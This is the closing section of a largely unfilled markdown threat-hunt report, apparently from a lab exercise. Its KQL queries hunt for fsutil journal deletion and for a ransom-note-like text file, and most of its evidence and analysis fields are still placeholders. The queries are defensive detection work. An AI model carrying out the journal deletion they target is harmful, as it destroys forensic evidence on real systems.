### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:10:04.9145097Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName == "fsutil.exe"
| where ProcessCommandLine has "deletejournal"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="801" height="150" alt="image" src="https://github.com/user-attachments/assets/9c14f007-8212-4d9f-8c0d-0583bf4ace64" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-26">🚩 <strong>Flag 26: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
SILENTLYNX_README.txt

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:05:01.1043756Z |
| Process | <Placeholder> |
| Parent Process | powershell.exe |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceFileEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-20T00:00:00Z)..datetime(2025-12-04T23:59:59Z))
| where FileName endswith ".txt"
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1538" height="279" alt="image" src="https://github.com/user-attachments/assets/14be10cd-b157-4612-bcc1-e71fde8b143f" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>
<!-- Duplicate Flag 1 section for Flags 2–20 -->

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- <Placeholder>
- <Placeholder>
- <Placeholder>

### Recommendations
- <Placeholder>
- <Placeholder>
- <Placeholder>

---

## 🧾 Final Assessment

<Concise executive-style conclusion summarizing risk, attacker sophistication, and defensive posture.>

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review  
- Evidence reproducible via advanced hunting  
- Techniques mapped directly to MITRE ATT&CK  

---
